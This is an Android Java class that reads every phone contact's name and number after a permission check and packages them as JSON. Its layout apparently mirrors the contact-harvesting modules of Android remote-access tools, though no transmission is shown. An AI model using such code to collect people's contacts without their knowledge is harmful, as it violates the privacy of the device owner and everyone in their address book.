package com.fason.app.features.contacts;

import android.Manifest;
import android.database.Cursor;
import android.provider.ContactsContract.CommonDataKinds.Phone;

import com.fason.app.core.FasonApp;
import com.fason.app.core.permissions.PermissionManager;

import org.json.JSONArray;
import org.json.JSONObject;

public class ContactsManager {

    public static JSONObject getContacts() {
        JSONObject result = new JSONObject();
        JSONArray list = new JSONArray();

        try {
            result.put("contactsList", list);

            // Check permission
            if (!PermissionManager.canIUse(Manifest.permission.READ_CONTACTS)) {
                result.put("error", "Permission denied");
                return result;
            }

            Cursor cur = FasonApp.getContext().getContentResolver().query(
                Phone.CONTENT_URI,
                new String[]{Phone.DISPLAY_NAME, Phone.NUMBER},
                null, null, Phone.DISPLAY_NAME + " ASC");

            if (cur != null) {
                int nameIdx = cur.getColumnIndex(Phone.DISPLAY_NAME);
                int numIdx = cur.getColumnIndex(Phone.NUMBER);

                while (cur.moveToNext()) {
                    JSONObject c = new JSONObject();
                    if (nameIdx >= 0) c.put("name", cur.getString(nameIdx));
                    if (numIdx >= 0) c.put("phoneNo", cur.getString(numIdx));
                    list.put(c);
                }
                cur.close();
            }
            result.put("total", list.length());
        } catch (Exception ignored) {}

        return result;
    }
}
